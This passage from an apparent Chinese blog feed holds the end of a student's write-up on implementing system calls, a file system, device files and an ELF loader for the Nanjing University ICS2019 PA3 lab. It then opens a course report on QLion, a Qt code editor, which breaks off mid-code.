id="collapse-c5ktsrlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (a[<span class="hljs-number">0</span>]) {    <span class="hljs-keyword">case</span> SYS_yield: _yield(); c-&gt;GPRx = <span class="hljs-number">0</span>; <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled syscall ID = %d"</span>, a[<span class="hljs-number">0</span>]);}</code></pre></div></div><p><code>do_event</code>分发:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gs4gxqlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-gs4gxqlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _EVENT_SYSCALL:<span class="hljs-built_in">Log</span>(<span class="hljs-string">"EVENT_SYSCALL"</span>);<span class="hljs-built_in">do_syscall</span>(c);</code></pre></div></div><p>发现还是不行。因为做完上下文管理和做这一部分中间隔了一段时间写qt大作业，所以不太熟悉了。仔细回顾了这一部分发现是没有在am中处理中断指令:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9vki0ylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-9vki0ylluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (c-&gt;irq){<span class="hljs-keyword">case</span> <span class="hljs-number">0x80</span>:  ev.event = _EVENT_SYSCALL;  <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:  ev.event = _EVENT_YIELD;  <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:  ev.event = _EVENT_ERROR;  <span class="hljs-keyword">break</span>;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211441604924_901_20230601235743907716_132_image-20230515195959094.png" alt="image-20230515195959094"><figcaption aria-hidden="true">image-20230515195959094</figcaption></figure><p>这次对了。0号事件好说。按照提示直接调用<code>_halt</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wyjuzjlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wyjuzjlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_exit: _halt(a[<span class="hljs-number">1</span>]); <span class="hljs-keyword">break</span>;</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211442505567_744_20230601235747183942_216_image-20230515200157973.png" alt="image-20230515200157973"><figcaption aria-hidden="true">image-20230515200157973</figcaption></figure><h3 id="操作系统之上的trm">操作系统之上的TRM</h3><h4 id="标准输出">标准输出</h4><p>根据<code>write</code>的函数声明(不用man，代码里也可以看出来)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fhyebxlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-fhyebxlluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">int</span> _write(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count) { <span class="hljs-keyword">return</span> _syscall_(SYS_write, fd, (<span class="hljs-type">intptr_t</span>)buf, count);}</code></pre></div></div><p>在<code>do_syscall()</code>中识别出系统调用号是<code>SYS_write</code>之后,检查<code>fd</code>的值,如果<code>fd</code>是<code>1</code>或<code>2</code>(分别代表<code>stdout</code>和<code>stderr</code>),则将<code>buf</code>为首地址的<code>len</code>字节输出到串口(使用<code>_putc()</code>即可).最后还要设置正确的返回值,</p><p>这一步就要man一下看看了。返回值的含义:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211443525293_370_20230601235751693727_656_image-20230515203231772.png" alt="image-20230515203231772"><figcaption aria-hidden="true">image-20230515203231772</figcaption></figure><p>因此可做如下实现(<code>do_syscall</code>中):</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6fos74lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-6fos74lluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_write:{  <span class="hljs-type">int</span> fd = (<span class="hljs-type">int</span>)a[<span class="hljs-number">1</span>];  <span class="hljs-type">char</span> *buf = (<span class="hljs-type">char</span> *)a[<span class="hljs-number">2</span>];  <span class="hljs-type">size_t</span> len = (<span class="hljs-type">size_t</span>)a[<span class="hljs-number">3</span>];  <span class="hljs-keyword">if</span>(fd==<span class="hljs-number">1</span>||fd==<span class="hljs-number">2</span>){    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i,++buf)      _putc(*buf);    c-&gt;GPRx=len;  }  <span class="hljs-keyword">else</span>{    c-&gt;GPRx=<span class="hljs-number">-1</span>;  }        <span class="hljs-keyword">break</span>;}</code></pre></div></div><p>不要忘了加<code>break</code>。。。。</p><p>好了，我们成功运行了永不停息的hello world。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211444501936_479_20230601235754766515_943_image-20230515203537734.png" alt="image-20230515203537734"><figcaption aria-hidden="true">image-20230515203537734</figcaption></figure><h4 id="堆区管理">堆区管理</h4><p><code>_sbrk()</code>实现:</p><ol type="1"><li>program break一开始的位置位于<code>_end</code></li><li>被调用时, 根据记录的program break位置和参数<code>increment</code>,计算出新program break</li><li>通过<code>SYS_brk</code>系统调用来让操作系统设置新program break</li><li>若<code>SYS_brk</code>系统调用成功, 该系统调用会返回<code>0</code>,此时更新之前记录的program break的位置, 并将旧programbreak的位置作为<code>_sbrk()</code>的返回值返回</li><li>若该系统调用失败, <code>_sbrk()</code>会返回<code>-1</code></li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8wrz6plluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-8wrz6plluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _end;...<span class="hljs-type">static</span> <span class="hljs-type">intptr_t</span> program_break=(<span class="hljs-type">intptr_t</span>)&amp;_end;<span class="hljs-type">void</span> *_sbrk(<span class="hljs-type">intptr_t</span> increment) {  <span class="hljs-type">intptr_t</span> prev_break=program_break;  <span class="hljs-keyword">if</span>(_syscall_(SYS_brk,program_break+increment,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">0</span>){    program_break+=increment;  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)prev_break;  }  <span class="hljs-keyword">else</span>{    <span class="hljs-built_in">return</span> (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>;  }}</code></pre></div></div><p>暂时只有单道应用程序，认为堆区分配总能成功:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-32v323lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-32v323lluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_brk:  c-&gt;GPRx = <span class="hljs-number">0</span>;  <span class="hljs-keyword">break</span>;</code></pre></div></div><p>输出能够走缓冲区了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211445507441_346_20230601235802225361_544_image-20230515211709483.png" alt="image-20230515211709483"><figcaption aria-hidden="true">image-20230515211709483</figcaption></figure><h3 id="必答题-1">必答题</h3><h6 id="hello程序是什么-它从而何来-要到哪里去它能吃吗">hello程序是什么,它从而何来, 要到哪里去，<del>它能吃吗</del></h6><h2 id="三阶段">三阶段</h2><h3 id="让loader使用文件">让loader使用文件</h3><p>实验指导书中说，需要先实现<code>fs_open()</code>,<code>fs_read()</code>和<code>fs_close()</code>,这样就可以在loader中使用文件名来指定加载的程序了。但是按照指导书的指示先实现了这三个指令，仿照原来的loader把所有的<code>randisk_read</code>改成<code>fs_read</code>后却一直内存超限。一想，<code>fs_read</code>只能从当前的open_offset开始读啊，读pheader时我们要从<code>elf_header.e_phoff</code>开始读。后面读每个块的时候也是类似。所以<code>fs_lseek</code>还是必不可少。当时实现loader的细节有些模糊了，所以干了蠢事。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-no7dlelluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-no7dlelluwpkzu"><pre><code class="hljs C++">Elf_Ehdr elf_header;<span class="hljs-type">int</span> fd = <span class="hljs-built_in">fs_open</span>(filename,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"filename: %s, fd: %d"</span>, filename, fd);<span class="hljs-type">size_t</span> read_len = <span class="hljs-built_in">fs_read</span>(fd, &amp;elf_header, <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));Elf_Phdr elf_program_header[elf_header.e_phnum];<span class="hljs-built_in">fs_lseek</span>(fd, elf_header.e_phoff, SEEK_SET);read_len = <span class="hljs-built_in">fs_read</span>(fd, elf_program_header, <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; elf_header.e_phnum; i++){  <span class="hljs-comment">// only load PT_LOAD type</span>  <span class="hljs-keyword">if</span> (elf_program_header[i].p_type == PT_LOAD)  {    <span class="hljs-built_in">fs_lseek</span>(fd, elf_program_header[i].p_offset, SEEK_SET);    read_len=<span class="hljs-built_in">fs_read</span>(fd, (<span class="hljs-type">void</span> *)elf_program_header[i].p_vaddr, elf_program_header[i].p_memsz);    <span class="hljs-built_in">assert</span>(read_len==elf_program_header[i].p_memsz);    <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(elf_program_header[i].p_vaddr + elf_program_header[i].p_filesz), <span class="hljs-number">0</span>, elf_program_header[i].p_memsz - elf_program_header[i].p_filesz);  }}<span class="hljs-built_in">fs_close</span>(fd);<span class="hljs-keyword">return</span> elf_header.e_entry;</code></pre></div></div><p>另外，关于如何加载新的文件也找了一些时间，在这里:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7honpolluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-7honpolluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span> </span>{  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-type">char</span> filename[] = <span class="hljs-string">"/bin/events"</span>;  <span class="hljs-comment">// load program here</span>  <span class="hljs-built_in">naive_uload</span>(<span class="hljs-literal">NULL</span>, filename);}</code></pre></div></div><h3 id="实现完整的文件系统">实现完整的文件系统</h3><p>另外几个api的实现较为简单(虽然中间<code>fs_write</code>还是写错了一次)，类似于PA2中的<code>scanf</code>等实现，按照其原本的含义<code>man</code>一下对照实现即可。代码不再赘述。</p><p>最后，还要注册事件，还有<strong>要在<code>navy-apps/libs/libos/src/nanos.c</code>里调用系统调用接口</strong>，当时实现<code>sbrk</code>的时候说了，文件系统没有说，就忘了，还一直疑惑明明实现的没问题就是打不开文件。。。</p><p>单元测试成功:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211446786000_613_20230601235805595522_997_image-20230517093932147.png" alt="image-20230517093932147"><figcaption aria-hidden="true">image-20230517093932147</figcaption></figure><h3 id="操作系统之上的ioe">操作系统之上的IOE</h3><h4 id="串口">串口</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lg6t4vlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-lg6t4vlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">serial_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span> </span>{  <span class="hljs-comment">// return 0;</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)  {    _putc(((<span class="hljs-type">char</span> *)buf)[i]);  }  <span class="hljs-keyword">return</span> len;}</code></pre></div></div><p>这时候读写文件就不需要对标准输入输出特判了，如:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1i9vnylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-1i9vnylluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (fd &lt;= <span class="hljs-number">2</span>){  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"ignore read from %d"</span>, fd);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h4 id="设备">设备</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2qiaw6lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-2qiaw6lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">events_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">//  return 0;</span>  <span class="hljs-type">int</span> key = <span class="hljs-built_in">read_key</span>();  <span class="hljs-keyword">if</span> (key != _KEY_NONE) <span class="hljs-comment">// key event</span>  {    <span class="hljs-comment">// Log("key event");</span>    <span class="hljs-keyword">if</span> (key &amp; <span class="hljs-number">0x8000</span>)    {      <span class="hljs-comment">// if (key&gt;=0x8002&amp;&amp;key&lt;=0x8004) change_gcb(key-0x8001);</span>      <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"kd %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);    }    <span class="hljs-keyword">else</span>    {      <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"ku %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);    }  }  <span class="hljs-keyword">else</span> <span class="hljs-comment">// time event</span>  {    <span class="hljs-comment">// if (now%1000==0) Log("time event");</span>    <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"t %d\n"</span>, <span class="hljs-built_in">uptime</span>());  }  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)buf);}</code></pre></div></div><p>这一部分一开始直接把函数参数里的<code>len</code>给返回了，就会一直报<code>receive event</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211447927853_539_20230601235809798522_812_image-20230517120535802.png" alt="image-20230517120535802"><figcaption aria-hidden="true">image-20230517120535802</figcaption></figure><p>更新文件描述表:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-osat16lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-osat16lluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">static</span> Finfo file_table[] __attribute__((used)) = {    {<span class="hljs-string">"stdin"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, invalid_write},    {<span class="hljs-string">"stdout"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, serial_write},    {<span class="hljs-string">"stderr"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, serial_write},    {<span class="hljs-string">"/dev/events"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, events_read, invalid_write},<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"files.h"</span></span>};</code></pre></div></div><p>正常工作:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211449189955_553_20230601235812963148_940_image-20230517120133366.png" alt="image-20230517120133366"><figcaption aria-hidden="true">image-20230517120133366</figcaption></figure><h4 id="vga">VGA</h4><p>这一部分指导书上说的是非常贴心，每一步该干什么都非常明确，真是非常难得。</p><p>其中主要是<code>fb_write</code>需要额外思索一下，其他的都是比较常规的流程。</p><p>另外注意VGA的一个像素占4bit。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-22y538lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-22y538lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">fb_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span></span><span class="hljs-function"></span>{<span class="hljs-type">int</span> width=<span class="hljs-built_in">screen_width</span>();<span class="hljs-type">int</span> x=(offset/<span class="hljs-number">4</span>)%width,y=(offset/<span class="hljs-number">4</span>)/width;<span class="hljs-built_in">draw_rect</span>((<span class="hljs-type">uint32_t</span>*)buf,x,y,len/<span class="hljs-number">4</span>,<span class="hljs-number">1</span>);<span class="hljs-keyword">return</span> len;}</code></pre></div></div><p>这一步也遇到了跑不起来的问题，不过补充了缺少的指令也成功运行起来了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211453140815_191_20230601235817127402_182_image-20230517154453440.png" alt="image-20230517154453440"><figcaption aria-hidden="true">image-20230517154453440</figcaption></figure><h3 id="运行仙剑奇侠传">运行仙剑奇侠传</h3><p>上一个vga实现<code>movsb</code>，紧接着实现<code>movswd</code>，将<strong>编译好</strong>的<code>pal</code>放到对应文件夹中，就可以运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211456492222_910_20230601235821779651_126_image-20230517164713444.png" alt="image-20230517164713444"><figcaption aria-hidden="true">image-20230517164713444</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211458145084_544_20230601235826834827_871_image-20230517164759642.png" alt="image-20230517164759642"><figcaption aria-hidden="true">image-20230517164759642</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211459457348_581_20230601235833556085_425_image-20230517170756063.png" alt="image-20230517170756063"><figcaption aria-hidden="true">image-20230517170756063</figcaption></figure><h3 id="展示批处理系统">展示批处理系统</h3><p>这是ics2019新加的一部分，实现起来非常简单，就是按照系统调用的逻辑，退出一个程序后把这个菜单程序再load进来。虽然简单，但是足够体现“操作系统的目的就是为了支持多道程序运行”的含义了。来看看我们现在都能支持哪些程序运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211500565292_239_20230601235836104923_738_image-20230517170521104.png" alt="image-20230517170521104"><figcaption aria-hidden="true">image-20230517170521104</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211502331847_228_20230601235838881129_188_image-20230517170629690.png" alt="image-20230517170629690"><figcaption aria-hidden="true">image-20230517170629690</figcaption></figure><h3 id="必答题-2">必答题</h3><h4 id="仙剑奇侠传究竟如何运行">仙剑奇侠传究竟如何运行</h4><h5 id="读出仙鹤信息">读出仙鹤信息</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211503669868_404_20230601235842381091_613_image-20230517174652184.png" alt="image-20230517174652184"><figcaption aria-hidden="true">image-20230517174652184</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211504698736_903_20230601235844474454_763_image-20230517174823390.png" alt="image-20230517174823390"><figcaption aria-hidden="true">image-20230517174823390</figcaption></figure><p>可以看到打开<code>mgo.mkf</code>调用了库函数<code>fopen</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211505735790_671_20230601235849337123_726_image-20230517174841335.png" alt="image-20230517174841335"><figcaption aria-hidden="true">image-20230517174841335</figcaption></figure><p>播放暂停时还会调用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211506634831_668_20230601235852617171_673_image-20230517175011723.png" alt="image-20230517175011723"><figcaption aria-hidden="true">image-20230517175011723</figcaption></figure><p>也是直接调用库函数。</p><p>这一部分的过程<a href="https://www.cnblogs.com/TKK-YLF/articles/16737509.html">网上</a>有一张图画的非常清晰，就不班门弄斧了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211507894301_491_20230601235857281415_765_image-20230517180110224.png" alt="image-20230517180110224"><figcaption aria-hidden="true">image-20230517180110224</figcaption></figure><h5 id="更新位置">更新位置</h5><p>这一部分如指导书所说，主要是<code>PAL_SplashScreen()</code>完成的。</p><p>首先<code>Allocate all the needed memory at once for simplification</code>，调用的是库中的<code>calloc</code>。</p><p>然后初始化屏幕</p><p><code>VIDEO_CreateCompatibleSurface -&gt; VIDEO_CreateCompatibleSizedSurface -&gt; SDL_CreateRGBSurface</code></p><p>读图片，获取仙鹤位置。这一部分前面已经分析了。</p><p>播放背景音乐。目前还没实现。</p><p>响应键盘事件，画屏幕</p><ul><li>背景：VIDEO_CopySurface -&gt; SDL_BlitSurface</li><li>仙鹤 &amp; 标题：一些特殊的方法，最后都归结为更新像素信息</li><li>VIDEO_UpdateScreen -&gt; (SDL_SoftStretch) / SDL_FillRect /SDL_UpdateRect</li><li>SDL_UpdateRect -&gt; NDL_DrawRect -&gt; open and write<code>/dev/fb</code></li></ul><p>最后通过<code>PAL_ProcessEvent</code>触发系统调用。这就是前面必答题中的内容了。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QLion代码编辑器</title>
    <link href="/posts/45065/"/>
    <url>/posts/45065/</url>
    
    <content type="html"><![CDATA[<h1 id="高级语言程序设计实验报告">高级语言程序设计实验报告</h1><p>南开大学 计算机学院 田佳业 2013599 1013班</p><p>2023年5月15日</p><h2 id="作业题目">作业题目</h2><p>代码编辑器QLion</p><h2 id="开发软件">开发软件</h2><p>Qt 6.4.2</p><p>CLion 2023.1.2</p><p>Qt Designer</p><h2 id="课题要求">课题要求</h2><ul><li>采用C++语言编写</li><li>采用面向对象的设计理念</li></ul><h2 id="项目计划完成情况">项目计划完成情况</h2><ul class="task-list"><li><input type="checkbox" checked="">CLion界面风格</li><li><input type="checkbox" checked="">文本编辑器基本功能</li><li><input type="checkbox" checked="">代码高亮</li><li><input type="checkbox" checked="">文件目录树</li><li><input type="checkbox" checked="">查找替换</li><li><input type="checkbox" checked="">快速注释</li><li><input type="checkbox" checked="">Cmake项目运行</li><li><input type="checkbox" checked="">主题配置</li><li><input type="checkbox" checked="">括号补全和自动缩进</li></ul><p>还有好多其他作业要做呜呜呜</p><p>Update:考试周临近，主播溜大了</p><p><a href="https://www.bilibili.com/video/BV12m4y1b7SN">BiliBili视频演示</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210624849799_291_20230526120414661830_608_image-20230526113432166.png" alt="image-20230526113432166"><figcaption aria-hidden="true">image-20230526113432166</figcaption></figure><h2 id="项目结构">项目结构</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210625984819_432_20230526120417791162_622_20230515214325856307_437_image-20230514204456321.png" alt="image-20230514204456321"><figcaption aria-hidden="true">image-20230514204456321</figcaption></figure><h2 id="主要流程">主要流程</h2><p>由于整个项目较为复杂，下面仅简要介绍重要部分的实现思路，有一些实现细节可能难免不能面面俱到。</p><h3 id="界面风格">界面风格</h3><p>使用QT提供<code>fusion</code>风格，并结合使用<code>platte</code>和<code>stylesheet</code>完成暗黑风格的绘制。在<a href="https://gist.github.com/QuantumCD/6245215">此代码片段</a>基础上进行了微调。</p><h3 id="文本编辑器">文本编辑器</h3><p>文本编辑器部分主要的难点在于tab的有效管理。</p><h4 id="添加标签页">添加标签页</h4><p>添加标签页有两种情况，一种是新建的没有与文件关联的标签页，另一种是通过文件打开的标签页。</p><p>这一部分的主要亮点:</p><ul><li><p>实现了类似VSCode中打开同名但不同路径的文件时，可以自动通过显示文件路径来区分来自不同路径的文件。</p></li><li><p>注意到VSCode新建若干个未与文件关联的标签页时，会选取当前可用的最小标签页。如下图所示新建标签页会命名为<code>Untitled-2</code>。在这个项目中也复现了这样的设计。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210628831543_906_20230526120422247570_581_20230515214327370668_329_image-20230514201910114.png" alt="image-20230514201910114"><figcaption aria-hidden="true">image-20230514201910114</figcaption></figure></li></ul><p>第一点的实现可以逐个标签页进行遍历，也可以采用字典树等方式进行优化。在这个项目中采用了较容易实现的遍历方式。</p><p>第二点的实现使用了<code>unordered_set</code>存储了当前存在的未命名标签页，逐ID比对。</p><p>为了便于通过路径快速寻找到对应的标签页，可以将<code>&lt;filePath，tabINdex&gt;</code>的对应关系存到一个<code>unordered_map</code>中。哈希表可以实现近似<code>O(1)</code>的查找替换的复杂度。</p><p>下面是添加标签页的部分代码，有两个重载函数，分别对应了是否关联文件的标签页。</p><p>关联文件的标签页:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1ao2chlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-1ao2chlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionTabWidget::addNewTab</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text, <span class="hljs-type">const</span> QString &amp;filePath)</span> </span>{    <span class="hljs-keyword">if</span> (mainWindow) {        <span class="hljs-type">bool</span> needToDistinguish = <span class="hljs-literal">false</span>;        QString fileName = <span class="hljs-built_in">QFileInfo</span>(filePath).<span class="hljs-built_in">fileName</span>();        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">count</span>(); i++) {            QString filePathOfCurrentTab = <span class="hljs-built_in">getCodePage</span>(i)-&gt;<span class="hljs-built_in">getFilePath</span>();            <span class="hljs-keyword">if</span> (filePathOfCurrentTab == filePath) {                <span class="hljs-built_in">setCurrentIndex</span>(i);                <span class="hljs-keyword">return</span>;            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QFileInfo</span>(filePathOfCurrentTab).<span class="hljs-built_in">fileName</span>() == fileName) {                <span class="hljs-built_in">setTabText</span>(i, filePathOfCurrentTab);                needToDistinguish = <span class="hljs-literal">true</span>;            }        }        <span class="hljs-keyword">if</span> (needToDistinguish) {            fileName = filePath;        }        <span class="hljs-comment">// if the text is too long, do not init Highlighter</span>        <span class="hljs-keyword">if</span> (text.<span class="hljs-built_in">length</span>() &gt; <span class="hljs-number">10000</span>) {            <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span class="hljs-keyword">this</span>, <span class="hljs-literal">false</span>), fileName);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span 